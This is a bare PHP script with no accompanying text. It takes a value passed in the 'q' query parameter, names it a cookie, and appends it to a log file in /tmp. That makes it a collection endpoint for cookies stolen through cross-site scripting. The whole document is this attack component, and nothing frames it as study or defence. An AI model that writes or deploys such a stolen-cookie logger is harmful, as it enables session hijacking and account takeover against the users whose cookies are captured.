<?php
    $filename="/tmp/log.txt";
    $fp=fopen($filename, 'a');
    $cookie=$_GET['q'];
    fwrite($fp, $cookie);
    fclose($fp);
?>